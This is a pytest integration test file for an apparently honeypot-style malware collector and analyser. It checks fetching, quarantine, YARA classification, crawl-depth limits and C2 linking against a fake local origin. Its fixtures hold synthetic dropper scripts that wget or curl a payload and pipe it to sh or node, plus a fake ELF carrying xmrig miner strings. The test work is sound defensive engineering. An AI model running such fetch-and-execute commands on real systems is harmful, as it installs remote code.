"""Fetch -> sample -> analysis -> links against a real database and an in-process fake origin.

The fake origin is also the "proxy" (127.0.0.1 only), so the fetches really travel the egress
client and gate code, but nothing leaves the test process. All payloads are synthetic buffers.
Runs as the least-privilege ``suckerpot_collector`` / ``suckerpot_analyzer`` roles.
"""

from __future__ import annotations

import asyncio
import os
import struct
import subprocess
import sys
from collections.abc import AsyncIterator
from datetime import UTC, datetime, timedelta
from pathlib import Path
from typing import Any

import pytest
from sqlalchemy import text
from sqlalchemy.exc import DBAPIError
from sqlalchemy.ext.asyncio import (
    AsyncEngine,
    AsyncSession,
    async_sessionmaker,
    create_async_engine,
)
from suckerpot_analysis import ANALYSIS_VERSION
from suckerpot_db import create_session_factory, database_url_from_env
from suckerpot_db.roles import apply_roles
from suckerpot_db.sample_kinds import plain_web_sample

from collector.analyzer import AnalyzerService
from collector.config import CollectorSettings
from collector.service import CollectorService
from collector.store import Quarantine
from tests.fakes import FakeProxy, Reply, open_gate

pytestmark = pytest.mark.integration

ROOT = Path(__file__).resolve().parents[2]
DB_DIR = Path(os.environ.get("DB_DIR", ROOT / "db"))
RULES = ROOT / "collector" / "rules" / "yara"
COLLECTOR_PW = "collector-test-password-0123456789"
ANALYZER_PW = "analyzer-test-password-0123456789"
ENV: dict[str, str] = {
    **os.environ,
    "POSTGRES_INGEST_USER": os.environ.get("POSTGRES_INGEST_USER", "suckerpot_ingest"),
    "POSTGRES_INGEST_PASSWORD": os.environ.get("POSTGRES_INGEST_PASSWORD", "ingest-test-password"),
    "POSTGRES_API_USER": os.environ.get("POSTGRES_API_USER", "suckerpot_api"),
    "POSTGRES_API_PASSWORD": os.environ.get("POSTGRES_API_PASSWORD", "api-test-password"),
    "POSTGRES_COLLECTOR_PASSWORD": COLLECTOR_PW,
    "POSTGRES_ANALYZER_PASSWORD": ANALYZER_PW,
}
TABLES = (
    "fetch_targets, fetch_attempts, samples, sample_analysis, sample_sources, sample_links, "
    "indicators, enrichment_quota, enrichment_status"
)
NOW = datetime(2026, 5, 1, 12, 0, tzinfo=UTC)
HOST = "http://files.example.test"
SCRIPT = (
    b"#!/bin/sh\ncd /tmp\n"
    b"wget http://dl.example.test/bins/x.arm7 -O x\n"
    b"wget http://198.51.100.9/ignored.sh\n"
    b"chmod 777 x; ./x\n"
)


def tiny_elf_with_miner_strings() -> bytes:
    ident = b"\x7fELF" + bytes([2, 1, 1, 0]) + bytes(8)
    header = struct.pack("<HHIQQQIHHHHHH", 2, 62, 1, 0x400000, 64, 0, 0, 64, 56, 0, 64, 0, 0)
    body = b"\x00xmrig donate-level randomx\x00stratum+tcp://8.8.4.4:4444\x00pool 8.8.4.4:4444\x00"
    return ident + header + b"\x00" * 64 + body


class Clock:
    def __init__(self, start: datetime = NOW) -> None:
        self.now = start

    def __call__(self) -> datetime:
        return self.now


def _alembic(*args: str) -> None:
    subprocess.run(
        [sys.executable, "-m", "alembic", *args], cwd=DB_DIR, env=ENV, check=True, timeout=180
    )


def _role_engine(user: str, password: str) -> AsyncEngine:
    url = database_url_from_env({**ENV, "POSTGRES_USER": user, "POSTGRES_PASSWORD": password})
    return create_async_engine(url)


@pytest.fixture
async def owner() -> AsyncIterator[AsyncEngine]:
    _alembic("upgrade", "head")
    engine = create_async_engine(database_url_from_env(ENV))
    # Retry when Postgres picks the reset as a deadlock victim (TRUNCATE ... CASCADE can cross a
    # TimescaleDB background job).
    for attempt in range(5):
        try:
            async with engine.begin() as conn:
                await conn.run_sync(lambda c: apply_roles(c, ENV))
                await conn.execute(text(f"TRUNCATE {TABLES} CASCADE"))
            break
        except DBAPIError as exc:
            if getattr(exc.orig, "sqlstate", None) != "40P01" or attempt == 4:
                raise
            await asyncio.sleep(0.2 * (attempt + 1))
    yield engine
    await engine.dispose()


@pytest.fixture
async def factories(
    owner: AsyncEngine,
) -> AsyncIterator[tuple[async_sessionmaker[AsyncSession], async_sessionmaker[AsyncSession]]]:
    coll = _role_engine(
        os.environ.get("POSTGRES_COLLECTOR_USER", "suckerpot_collector"), COLLECTOR_PW
    )
    ana = _role_engine(os.environ.get("POSTGRES_ANALYZER_USER", "suckerpot_analyzer"), ANALYZER_PW)
    yield create_session_factory(coll), create_session_factory(ana)
    await coll.dispose()
    await ana.dispose()


def settings(tmp_path: Path, **kw: Any) -> CollectorSettings:
    base: dict[str, Any] = {
        "enabled": True,
        "max_bytes": 64 * 1024,
        "timeout_s": 10,
        "connect_timeout_s": 2,
        "host_interval_s": 0.0,
        "quarantine_dir": tmp_path / "q",
        "rules_dir": RULES,
        "heartbeat_path": tmp_path / "hb",
        "analyzer_timeout_s": 30,
        "max_depth": 2,
    }
    base.update(kw)
    return CollectorSettings(**base)


async def add_indicator(owner: AsyncEngine, value: str, *, demo: bool = False) -> int:
    async with owner.begin() as conn:
        row = await conn.execute(
            text(
                "INSERT INTO indicators (type, value, role, host, first_seen, last_seen, demo) "
                "VALUES ('url', :v, 'download_host', 'h', :n, :n, :d) RETURNING id"
            ),
            {"v": value, "n": NOW, "d": demo},
        )
        return int(row.scalar_one())


async def rows(owner: AsyncEngine, sql: str, **params: Any) -> list[Any]:
    async with owner.connect() as conn:
        return list((await conn.execute(text(sql), params)).all())


def handler_for(files: dict[str, Reply]) -> Any:
    def handler(url: str, headers: dict[str, str]) -> Reply:
        return files.get(url, Reply(404, body=b"no"))

    return handler


async def test_fetch_then_analysis_then_links(
    owner: AsyncEngine, factories: Any, tmp_path: Path
) -> None:
    coll_f, ana_f = factories
    s = settings(tmp_path)
    store = Quarantine(s.quarantine_dir)
    store.prepare()
    files = {
        f"{HOST}/install.sh": Reply(body=SCRIPT),
        "http://dl.example.test/bins/x.arm7": Reply(body=tiny_elf_with_miner_strings()),
    }
    proxy = FakeProxy(handler_for(files))
    await add_indicator(owner, f"{HOST}/install.sh#frag")
    await add_indicator(owner, "http://dl.example.test/never-demo", demo=True)
    await add_indicator(
        owner,
        "http://10.1.2.3/internal.sh",  # gitleaks:allow
    )
    await add_indicator(owner, "tftp://files.example.test/boot.bin")
    await add_indicator(owner, "http://localhost/x")

    async with proxy.running():
        gate = await open_gate(proxy.url)
        clock = Clock()
        svc = CollectorService(s, coll_f, store, gate, clock=clock)
        analyzer = AnalyzerService(s, ana_f, store, clock=clock)

        first = await svc.step()
        assert len(first) == 1  # only the real, public, non-demo URL is fetched
        assert [u for u, _ in proxy.seen] == [f"{HOST}/install.sh"]
        refused = await rows(owner, "SELECT url, status, last_error FROM fetch_targets ORDER BY id")
        by_status = {r.status for r in refused}
        assert {"fetched", "refused", "unsupported"} <= by_status
        assert not any("demo" in r.url for r in refused)

        # The analyzer reads the stored file and writes findings plus the next-stage target.
        assert await analyzer.step() == 1
        sample = (await rows(owner, "SELECT * FROM samples"))[0]
        assert sample.analysis_status == "done"
        assert sample.kind == "script"
        assert sample.stored is True
        links = await rows(
            owner,
            "SELECT kind, value, target_id FROM sample_links WHERE sha256 = :s",
            s=sample.sha256,
        )
        by_value = {r.value: r for r in links}
        nxt = by_value["http://dl.example.test/bins/x.arm7"]
        assert nxt.kind == "next_url"
        assert nxt.target_id is not None
        doc = by_value["http://198.51.100.9/ignored.sh"]
        assert doc.target_id is None  # documentation range: recorded, never queued
        child = (
            await rows(
                owner,
                "SELECT depth, parent_sha256, status FROM fetch_targets WHERE id = :i",
                i=nxt.target_id,
            )
        )[0]
        assert (child.depth, child.parent_sha256, child.status) == (1, sample.sha256, "pending")
        hash_ind = await rows(owner, "SELECT trusted FROM indicators WHERE type = 'hash'")
        assert [r.trusted for r in hash_ind] == [True]

        # Second stage: the collector fetches the next URL; the analyzer finds the C2.
        second = await svc.step()
        assert len(second) == 1
        assert await analyzer.step() == 1
        elf = (await rows(owner, "SELECT * FROM samples WHERE kind = 'elf'"))[0]
        assert elf.family == "xmrig"
        assert elf.analysis_status == "done"
        c2 = await rows(
            owner,
            "SELECT l.kind, l.value, l.indicator_id, i.role FROM sample_links l "
            "LEFT JOIN indicators i ON i.id = l.indicator_id WHERE l.sha256 = :s AND l.kind = 'c2_ip'",
            s=elf.sha256,
        )
        assert c2 and c2[0].value == "8.8.4.4"
        assert c2[0].role == "c2"
        sources = await rows(owner, "SELECT count(*) AS n FROM sample_sources")
        assert sources[0].n == 2
        analysis = await rows(
            owner, "SELECT yara, strings FROM sample_analysis WHERE sha256 = :s", s=elf.sha256
        )
        assert analysis[0].yara and analysis[0].strings

    # files on disk: sha256 name, mode 0400
    stored = [p for p in s.quarantine_dir.rglob("*") if p.is_file()]
    assert len(stored) == 2
    assert {oct(p.stat().st_mode & 0o777) for p in stored} == {"0o400"}
    status = await rows(owner, "SELECT detail FROM enrichment_status WHERE name = 'collector'")
    assert status[0].detail["state"] == "running"


async def test_depth_cap_stops_the_chain(
    owner: AsyncEngine, factories: Any, tmp_path: Path
) -> None:
    coll_f, ana_f = factories
    s = settings(tmp_path, max_depth=0)
    store = Quarantine(s.quarantine_dir)
    store.prepare()
    proxy = FakeProxy(handler_for({f"{HOST}/install.sh": Reply(body=SCRIPT)}))
    await add_indicator(owner, f"{HOST}/install.sh")
    async with proxy.running():
        gate = await open_gate(proxy.url)
        svc = CollectorService(s, coll_f, store, gate, clock=Clock())
        await svc.step()
        await AnalyzerService(s, ana_f, store).step()
    targets = await rows(owner, "SELECT count(*) AS n FROM fetch_targets")
    assert targets[0].n == 1
    link = await rows(owner, "SELECT target_id FROM sample_links WHERE kind = 'next_url'")
    assert link and all(r.target_id is None for r in link)


async def add_sample(
    owner: AsyncEngine, sha: str, kind: str, severity: str = "info", family: str | None = None
) -> None:
    async with owner.begin() as conn:
        await conn.execute(
            text(
                "INSERT INTO samples (sha256, sha1, md5, size, kind, severity, family, first_seen, "
                "last_seen, analysis_status) VALUES "
                "(:sha, :sha1, :md5, 10, :kind, :sev, :fam, :n, :n, 'done')"
            ),
            {
                "sha": sha, "sha1": sha[:40], "md5": sha[:32], "kind": kind, "sev": severity,
                "fam": family, "n": NOW,
            },
        )  # fmt: skip


async def add_source(
    owner: AsyncEngine,
    sha: str,
    url: str,
    *,
    depth: int,
    parent: str | None = None,
    indicator: int | None = None,
    via: str = "web_asset",
) -> None:
    """A fetched target that served `sha`, linked from `parent` (a link labelled `via`)."""
    async with owner.begin() as conn:
        tid = await conn.scalar(
            text(
                "INSERT INTO fetch_targets (url, scheme, host, indicator_id, parent_sha256, depth, "
                "status, first_seen, last_sha256, typed) VALUES "
                "(:u, 'http', 'files.example.test', :i, :p, :d, 'fetched', :n, :sha, :ty) "
                "RETURNING id"
            ),
            {
                "u": url, "i": indicator, "p": parent, "d": depth, "n": NOW, "sha": sha,
                "ty": indicator is not None,
            },
        )  # fmt: skip
        await conn.execute(
            text(
                "INSERT INTO sample_sources (sha256, target_id, first_fetched, last_fetched) "
                "VALUES (:sha, :t, :n, :n)"
            ),
            {"sha": sha, "t": tid, "n": NOW},
        )
        if parent is not None:
            await add_link(conn, parent, url, tid, via)


async def add_link(conn: Any, parent: str, url: str, target: int, via: str) -> None:
    """The `sample_links` row of a link from `parent` to a fetch target."""
    await conn.execute(
        text(
            "INSERT INTO sample_links (sha256, kind, value, source, confidence, target_id) "
            "VALUES (:p, 'next_url', :u, :via, 'high', :t)"
        ),
        {"p": parent, "u": url, "via": via, "t": target},
    )


async def add_pending(
    owner: AsyncEngine, url: str, parent: str, *, indicator: int | None = None, depth: int = 1
) -> None:
    async with owner.begin() as conn:
        tid = await conn.scalar(
            text(
                "INSERT INTO fetch_targets (url, scheme, host, indicator_id, parent_sha256, depth, "
                "status, first_seen, next_attempt_at, typed) VALUES "
                "(:u, 'http', 'files.example.test', :i, :p, :d, 'pending', :n, :n, :ty) "
                "RETURNING id"
            ),
            {
                "u": url,
                "i": indicator,
                "p": parent,
                "d": depth,
                "n": NOW,
                "ty": indicator is not None,
            },
        )
        await add_link(conn, parent, url, tid, "web_asset")


DL = "http://dl.example.test"
STYLE = b"body{background:url(http://dl.example.test/bg.png)}a{color:red}p{margin:0}"
INNER_PAGE = (
    b'<!doctype html><html><body><a href="http://dl.example.test/deeper.html">x</a></body></html>'
)
LINKED_PAGE = (
    b'<!doctype html><html><head><link rel="stylesheet" href="http://dl.example.test/site.css">'
    b'</head><body><a href="http://dl.example.test/inner.html">more</a>'
    b'<a href="http://dl.example.test/bins/x.arm7">download</a></body></html>'
)


async def hashes(owner: AsyncEngine) -> set[str]:
    return {r.value for r in await rows(owner, "SELECT value FROM indicators WHERE type = 'hash'")}


async def sample_of(owner: AsyncEngine, url: str) -> Any:
    return (
        await rows(
            owner,
            "SELECT s.*, a.deobfuscated FROM samples s JOIN fetch_targets t "
            "ON t.last_sha256 = s.sha256 LEFT JOIN sample_analysis a ON a.sha256 = s.sha256 "
            "WHERE t.url = :u",
            u=url,
        )
    )[0]


async def test_a_typed_page_is_attacker_content_and_its_assets_stop_the_crawl(
    owner: AsyncEngine, factories: Any, tmp_path: Path
) -> None:
    coll_f, ana_f = factories
    s = settings(tmp_path)
    store = Quarantine(s.quarantine_dir)
    store.prepare()
    files = {
        f"{HOST}/index.html": Reply(body=LINKED_PAGE),
        f"{DL}/site.css": Reply(body=STYLE),
        f"{DL}/inner.html": Reply(body=INNER_PAGE),
        f"{DL}/bins/x.arm7": Reply(body=tiny_elf_with_miner_strings()),
    }
    proxy = FakeProxy(handler_for(files))
    await add_indicator(owner, f"{HOST}/index.html")
    async with proxy.running():
        gate = await open_gate(proxy.url)
        clock = Clock()
        svc = CollectorService(s, coll_f, store, gate, clock=clock)
        analyzer = AnalyzerService(s, ana_f, store, clock=clock)
        assert len(await svc.step()) == 1
        assert await analyzer.step() == 1
        clock.now += timedelta(minutes=1)  # the assets are seen after the page
        page = await sample_of(owner, f"{HOST}/index.html")
        assert (page.kind, page.severity, page.family) == ("html", "info", None)
        # An attacker asked for this page: a hash indicator, and its links are followed.
        assert await hashes(owner) == {page.sha256}
        assert page.deobfuscated is not None
        queued = await rows(
            owner, "SELECT url, depth, parent_sha256 FROM fetch_targets WHERE depth = 1"
        )
        assert {(r.url, r.parent_sha256) for r in queued} == {
            (f"{DL}/site.css", page.sha256),
            (f"{DL}/inner.html", page.sha256),
            (f"{DL}/bins/x.arm7", page.sha256),
        }

        # Its assets are fetched (depth 1). The style sheet and the inner page were reached
        # through the links of a page: plain web content, no hash, and their links stay put.
        assert len(await svc.step()) == 3
        assert await analyzer.step() == 3
        css = await sample_of(owner, f"{DL}/site.css")
        inner = await sample_of(owner, f"{DL}/inner.html")
        elf = await sample_of(owner, f"{DL}/bins/x.arm7")
        assert (css.kind, inner.kind, elf.kind, elf.family) == ("css", "html", "elf", "xmrig")
        assert await hashes(owner) == {page.sha256, elf.sha256}
        assert css.deobfuscated is None and inner.deobfuscated is None
        for sample in (css, inner):
            links = await rows(
                owner, "SELECT 1 FROM sample_links WHERE sha256 = :s", s=sample.sha256
            )
            assert links == []
        urls = {r.url for r in await rows(owner, "SELECT url FROM fetch_targets")}
        assert f"{DL}/bg.png" not in urls and f"{DL}/deeper.html" not in urls
        assert await svc.step() == []  # nothing else to fetch

        # A sample analysed by an older version is classified again on its own, with no manual
        # step, oldest first, so a page is classified before the files reached through it.
        async with owner.begin() as conn:
            await conn.execute(
                text("UPDATE samples SET kind = 'text', severity = 'notice', analysis_version = 1")
            )
        assert await analyzer.step() == 4
        again = await rows(owner, "SELECT kind, severity, analysis_version FROM samples")
        assert {(r.kind, r.analysis_version) for r in again} == {
            ("html", ANALYSIS_VERSION),
            ("css", ANALYSIS_VERSION),
            ("elf", ANALYSIS_VERSION),
        }
        assert await analyzer.step() == 0
        assert await hashes(owner) == {page.sha256, elf.sha256}


async def test_a_page_linked_from_a_script_is_attacker_content(
    owner: AsyncEngine, factories: Any, tmp_path: Path
) -> None:
    coll_f, ana_f = factories
    s = settings(tmp_path)
    store = Quarantine(s.quarantine_dir)
    store.prepare()
    dropper = b"#!/bin/sh\nwget http://dl.example.test/stage.html -O- | sh\n"
    stage = (
        b"<!doctype html><html><body>"
        b'<a href="http://dl.example.test/bins/x.arm7">x</a></body></html>'
    )
    files = {f"{HOST}/d.sh": Reply(body=dropper), f"{DL}/stage.html": Reply(body=stage)}
    proxy = FakeProxy(handler_for(files))
    await add_indicator(owner, f"{HOST}/d.sh")
    async with proxy.running():
        gate = await open_gate(proxy.url)
        clock = Clock()
        svc = CollectorService(s, coll_f, store, gate, clock=clock)
        analyzer = AnalyzerService(s, ana_f, store, clock=clock)
        await svc.step()
        await analyzer.step()
        assert len(await svc.step()) == 1  # the next stage, at depth 1
        assert await analyzer.step() == 1
    page = await sample_of(owner, f"{DL}/stage.html")
    assert (page.kind, page.severity) == ("html", "info")
    # A script asked for it: whatever its kind, it is the next stage of a dropper.
    assert page.sha256 in await hashes(owner)
    child = await rows(
        owner,
        "SELECT depth, parent_sha256 FROM fetch_targets WHERE url = :u",
        u=f"{DL}/bins/x.arm7",
    )
    assert [(r.depth, r.parent_sha256) for r in child] == [(2, page.sha256)]


async def test_a_spared_page_is_analysed_again_once_an_attacker_asks_for_it(
    owner: AsyncEngine, factories: Any, tmp_path: Path
) -> None:
    coll_f, ana_f = factories
    s = settings(tmp_path)
    store = Quarantine(s.quarantine_dir)
    store.prepare()
    files = {
        f"{HOST}/index.html": Reply(body=LINKED_PAGE),
        f"{DL}/site.css": Reply(body=STYLE),
        f"{DL}/inner.html": Reply(body=INNER_PAGE),
        f"{HOST}/mirror.html": Reply(body=INNER_PAGE),  # the same bytes from a typed URL
    }
    proxy = FakeProxy(handler_for(files))
    await add_indicator(owner, f"{HOST}/index.html")
    async with proxy.running():
        gate = await open_gate(proxy.url)
        clock = Clock()
        svc = CollectorService(s, coll_f, store, gate, clock=clock)
        analyzer = AnalyzerService(s, ana_f, store, clock=clock)
        await svc.step()
        await analyzer.step()
        await svc.step()  # site.css, inner.html (x.arm7 answers 404)
        await analyzer.step()
        css = await sample_of(owner, f"{DL}/site.css")
        inner = await sample_of(owner, f"{DL}/inner.html")
        assert {css.sha256, inner.sha256}.isdisjoint(await hashes(owner))
        assert css.spared and inner.spared
        # A sensor saw the style sheet's sha256 somewhere: being spared is a flag of its own.
        async with owner.begin() as conn:
            await conn.execute(
                text(
                    "INSERT INTO indicators (type, value, role, first_seen, last_seen) "
                    "VALUES ('hash', :v, 'hash', :n, :n)"
                ),
                {"v": css.sha256, "n": NOW},
            )

        # An attacker types the style sheet's URL: the file it already served is analysed again.
        await add_indicator(owner, f"{DL}/site.css")
        # The same page bytes come from a URL an attacker typed.
        await add_indicator(owner, f"{HOST}/mirror.html")
        await svc.step()
        status = {
            r.sha256: r.analysis_status
            for r in await rows(owner, "SELECT sha256, analysis_status FROM samples")
        }
        assert status[css.sha256] == status[inner.sha256] == "pending"
        assert await analyzer.step() == 2
        assert {css.sha256, inner.sha256} <= await hashes(owner)
        urls = {r.url for r in await rows(owner, "SELECT url FROM fetch_targets")}
        assert {f"{DL}/bg.png", f"{DL}/deeper.html"} <= urls  # their links are followed now
        assert await analyzer.step() == 0  # analysed once, not in a loop

        # The indicator of the typed URL is pruned later: the URL stays typed, the file evidence.
        async with owner.begin() as conn:
            await conn.execute(
                text("DELETE FROM indicators WHERE value = :u"), {"u": f"{DL}/site.css"}
            )
        target = (
            await rows(
                owner,
                "SELECT indicator_id, typed FROM fetch_targets WHERE url = :u",
                u=f"{DL}/site.css",
            )
        )[0]
        assert (target.indicator_id, target.typed) == (None, True)
        cond = plain_web_sample("s")
        plain = f"SELECT {cond} AS p FROM samples s WHERE s.sha256 = :s"  # noqa: S608
        assert (await rows(owner, plain, s=css.sha256))[0].p is False
        async with owner.begin() as conn:
            await conn.execute(text("UPDATE samples SET analysis_version = 1"))
        await analyzer.step()
        again = await sample_of(owner, f"{DL}/site.css")
        assert (again.analysis_status, again.spared) == ("done", False)


async def test_a_later_parent_that_is_a_script_reopens_a_spared_asset(
    owner: AsyncEngine, factories: Any, tmp_path: Path
) -> None:
    coll_f, ana_f = factories
    s = settings(tmp_path)
    store = Quarantine(s.quarantine_dir)
    store.prepare()
    page = b'<!doctype html><html><head><script src="http://dl.example.test/p.js"></script></head></html>'
    asset = b'"use strict";var u="http://dl.example.test/stage3.bin";window.u=u;'
    files = {
        f"{HOST}/a.html": Reply(body=page),
        f"{DL}/p.js": Reply(body=asset),
        f"{HOST}/s.sh": Reply(body=b"#!/bin/sh\ncurl -s http://dl.example.test/p.js | node\n"),
        f"{DL}/stage3.bin": Reply(body=tiny_elf_with_miner_strings()),
    }
    proxy = FakeProxy(handler_for(files))
    await add_indicator(owner, f"{HOST}/a.html")
    async with proxy.running():
        gate = await open_gate(proxy.url)
        clock = Clock()
        svc = CollectorService(s, coll_f, store, gate, clock=clock)
        analyzer = AnalyzerService(s, ana_f, store, clock=clock)
        await svc.step()
        await analyzer.step()
        clock.now += timedelta(minutes=1)
        await svc.step()  # p.js, an asset of the typed page
        await analyzer.step()
        asset_row = await sample_of(owner, f"{DL}/p.js")
        assert (asset_row.kind, asset_row.spared) == ("javascript", True)
        assert asset_row.sha256 not in await hashes(owner)

        # Later an attacker types a script that pipes the same URL to node. The URL was queued by
        # the page first; this second parent is what counts now.
        await add_indicator(owner, f"{HOST}/s.sh")
        clock.now += timedelta(minutes=1)
        await svc.step()
        assert await analyzer.step() == 1  # the script; it reopens the asset
        assert (await sample_of(owner, f"{DL}/p.js")).analysis_status == "pending"
        assert await analyzer.step() == 1
        assert asset_row.sha256 in await hashes(owner)
        stage = await rows(
            owner, "SELECT depth FROM fetch_targets WHERE url = :u", u=f"{DL}/stage3.bin"
        )
        assert [r.depth for r in stage] == [2]
        await svc.step()
    assert f"{DL}/stage3.bin" in {u for u, _ in proxy.seen}


async def test_a_link_in_the_text_of_a_typed_page_is_attacker_content(
    owner: AsyncEngine, factories: Any, tmp_path: Path
) -> None:
    coll_f, ana_f = factories
    s = settings(tmp_path)
    store = Quarantine(s.quarantine_dir)
    store.prepare()
    page = b"<!doctype html><html><body><p>get it at http://dl.example.test/s2.js</p></body></html>"
    stage = b'"use strict";var u="http://dl.example.test/bins/x.arm7";window.u=u;'
    files = {f"{HOST}/t.html": Reply(body=page), f"{DL}/s2.js": Reply(body=stage)}
    proxy = FakeProxy(handler_for(files))
    await add_indicator(owner, f"{HOST}/t.html")
    async with proxy.running():
        gate = await open_gate(proxy.url)
        clock = Clock()
        svc = CollectorService(s, coll_f, store, gate, clock=clock)
        analyzer = AnalyzerService(s, ana_f, store, clock=clock)
        await svc.step()
        await analyzer.step()
        link = await rows(
            owner, "SELECT source FROM sample_links WHERE value = :u", u=f"{DL}/s2.js"
        )
        assert [r.source for r in link] == ["script_url"]  # in the text, not an asset
        clock.now += timedelta(minutes=1)
        await svc.step()
        await analyzer.step()
    js = await sample_of(owner, f"{DL}/s2.js")
    assert (js.kind, js.severity, js.spared) == ("javascript", "info", False)
    assert js.sha256 in await hashes(owner)
    child = await rows(
        owner, "SELECT depth FROM fetch_targets WHERE url = :u", u=f"{DL}/bins/x.arm7"
    )
    assert [r.depth for r in child] == [2]


async def test_a_target_refused_as_web_parent_comes_back_when_a_script_links_it(
    owner: AsyncEngine, factories: Any, tmp_path: Path
) -> None:
    coll_f, ana_f = factories
    s = settings(tmp_path)
    store = Quarantine(s.quarantine_dir)
    store.prepare()
    root, page = "f0" * 32, "a1" * 32
    await add_sample(owner, root, "html")
    await add_sample(owner, page, "html")
    await add_source(owner, page, f"{HOST}/crawled.html", depth=1, parent=root)
    await add_pending(owner, f"{HOST}/old.js", page, depth=2)
    files = {
        f"{HOST}/old.js": Reply(body=b"#!/bin/sh\necho stage\n"),
        f"{HOST}/s.sh": Reply(body=b"#!/bin/sh\nwget http://files.example.test/old.js\n"),
    }
    proxy = FakeProxy(handler_for(files))
    async with proxy.running():
        gate = await open_gate(proxy.url)
        clock = Clock()
        svc = CollectorService(s, coll_f, store, gate, clock=clock)
        analyzer = AnalyzerService(s, ana_f, store, clock=clock)
        await svc.step()
        sql = "SELECT status, last_error FROM fetch_targets WHERE url = :u"
        assert [tuple(r) for r in await rows(owner, sql, u=f"{HOST}/old.js")] == [
            ("refused", "web_parent")
        ]
        await add_indicator(owner, f"{HOST}/s.sh")
        await svc.step()
        await analyzer.step()  # the script links the refused URL: back in the queue
        assert [tuple(r) for r in await rows(owner, sql, u=f"{HOST}/old.js")] == [("pending", None)]
        await svc.step()
    assert f"{HOST}/old.js" in {u for u, _ in proxy.seen}


async def test_a_target_queued_from_a_crawled_page_is_not_fetched(
    owner: AsyncEngine, factories: Any, tmp_path: Path
) -> None:
    coll_f, _ = factories
    s = settings(tmp_path)
    store = Quarantine(s.quarantine_dir)
    store.prepare()
    root, page, script, typed_page = "f0" * 32, "a1" * 32, "b2" * 32, "c3" * 32
    await add_sample(owner, root, "html")
    await add_sample(owner, page, "html")
    await add_sample(owner, script, "script", "notice")
    await add_sample(owner, typed_page, "html")
    # `page` was reached through a link of `root`: plain web. `typed_page` was typed by an attacker.
    await add_source(owner, page, f"{HOST}/crawled.html", depth=1, parent=root)
    typed_page_ind = await add_indicator(owner, f"{HOST}/typed.html")
    await add_source(owner, typed_page, f"{HOST}/typed.html", depth=0, indicator=typed_page_ind)
    typed = await add_indicator(owner, f"{HOST}/typed.sh")  # an attacker also typed this one
    await add_pending(owner, f"{HOST}/page-link.css", page, depth=2)  # inside a crawled page
    await add_pending(owner, f"{HOST}/typed.sh", page, indicator=typed, depth=2)  # ... but typed
    await add_pending(owner, f"{HOST}/script-link.sh", script)  # found inside a script
    await add_pending(owner, f"{HOST}/typed-page-link.css", typed_page)  # inside a typed page
    replies = {
        f"{HOST}/typed.sh": Reply(body=b"#!/bin/sh\necho typed\n"),
        f"{HOST}/script-link.sh": Reply(body=b"#!/bin/sh\necho linked\n"),
        f"{HOST}/typed-page-link.css": Reply(body=b"body{margin:0}"),
    }
    proxy = FakeProxy(handler_for(replies))
    async with proxy.running():
        gate = await open_gate(proxy.url)
        svc = CollectorService(s, coll_f, store, gate, clock=Clock())
        assert len(await svc.step()) == 4
    assert sorted(u for u, _ in proxy.seen) == sorted(replies)  # the page's link never left
    by_url = {
        r.url: r
        for r in await rows(owner, "SELECT url, status, last_error, attempts FROM fetch_targets")
    }
    skipped = by_url[f"{HOST}/page-link.css"]
    assert (skipped.status, skipped.last_error) == ("refused", "web_parent")
    for url in replies:
        assert by_url[url].status == "fetched", url
    quota = await rows(owner, "SELECT used FROM enrichment_quota")
    assert [r.used for r in quota] == [3]  # the skipped target spent nothing


async def test_a_refused_web_link_is_fetched_once_an_attacker_types_it(
    owner: AsyncEngine, factories: Any, tmp_path: Path
) -> None:
    coll_f, _ = factories
    s = settings(tmp_path)
    store = Quarantine(s.quarantine_dir)
    store.prepare()
    root, page, flagged = "f0" * 32, "a1" * 32, "b2" * 32
    await add_sample(owner, root, "html")
    await add_sample(owner, page, "html")
    await add_sample(owner, flagged, "html", "severe", "shell-dropper")
    for sha, url in ((page, f"{HOST}/p.html"), (flagged, f"{HOST}/f.html")):
        await add_source(owner, sha, url, depth=1, parent=root)
    await add_pending(owner, f"{HOST}/a.css", page, depth=2)
    await add_pending(owner, f"{HOST}/from-flagged.sh", flagged, depth=2)
    replies = {
        f"{HOST}/a.css": Reply(body=b"body{margin:0}"),
        f"{HOST}/from-flagged.sh": Reply(body=b"#!/bin/sh\necho flagged\n"),
    }
    proxy = FakeProxy(handler_for(replies))
    async with proxy.running():
        gate = await open_gate(proxy.url)
        svc = CollectorService(s, coll_f, store, gate, clock=Clock())
        assert len(await svc.step()) == 2
        # Only the link of the page no rule matched is skipped; the flagged page's is fetched.
        assert [u for u, _ in proxy.seen] == [f"{HOST}/from-flagged.sh"]
        sql = "SELECT status, last_error, attempts FROM fetch_targets WHERE url = :u"
        skipped = (await rows(owner, sql, u=f"{HOST}/a.css"))[0]
        assert (skipped.status, skipped.last_error) == ("refused", "web_parent")

        await add_indicator(owner, f"{HOST}/a.css")  # an attacker types the same URL
        assert len(await svc.step()) == 1
        assert [u for u, _ in proxy.seen] == [f"{HOST}/from-flagged.sh", f"{HOST}/a.css"]
        done = (await rows(owner, sql, u=f"{HOST}/a.css"))[0]
        assert (done.status, done.last_error) == ("fetched", None)


async def test_closed_gate_spends_nothing(
    owner: AsyncEngine, factories: Any, tmp_path: Path
) -> None:
    coll_f, _ = factories
    s = settings(tmp_path)
    store = Quarantine(s.quarantine_dir)
    store.prepare()
    proxy = FakeProxy(handler_for({f"{HOST}/a.sh": Reply(body=SCRIPT)}))
    await add_indicator(owner, f"{HOST}/a.sh")
    async with proxy.running():
        gate = await open_gate(proxy.url, open_=False)
        svc = CollectorService(s, coll_f, store, gate, clock=Clock())
        assert await svc.step() == []
    assert proxy.seen == []
    assert (await rows(owner, "SELECT count(*) AS n FROM fetch_attempts"))[0].n == 0
    assert (await rows(owner, "SELECT count(*) AS n FROM enrichment_quota"))[0].n == 0
    target = (await rows(owner, "SELECT status, attempts FROM fetch_targets"))[0]
    assert (target.status, target.attempts) == ("pending", 0)
    detail = (await rows(owner, "SELECT detail FROM enrichment_status WHERE name = 'collector'"))[
        0
    ].detail
    assert detail["state"] == "waiting"
    assert detail["reason"] == "not_checked"


async def test_gate_closing_during_a_fetch_refunds_the_quota(
    owner: AsyncEngine, factories: Any, tmp_path: Path
) -> None:
    coll_f, _ = factories
    s = settings(tmp_path)
    store = Quarantine(s.quarantine_dir)
    store.prepare()
    await add_indicator(owner, f"{HOST}/a.sh")
    proxy = FakeProxy(handler_for({}))
    async with proxy.running():
        gate = await open_gate(proxy.url)
        svc = CollectorService(s, coll_f, store, gate, clock=Clock())
        await svc.sync_targets()
        gate._status = type(gate._status)(False, "tunnel_down", None, gate._status.checked_at)
        targets = await svc._due(5)
        assert await svc._handle(targets[0]) is None
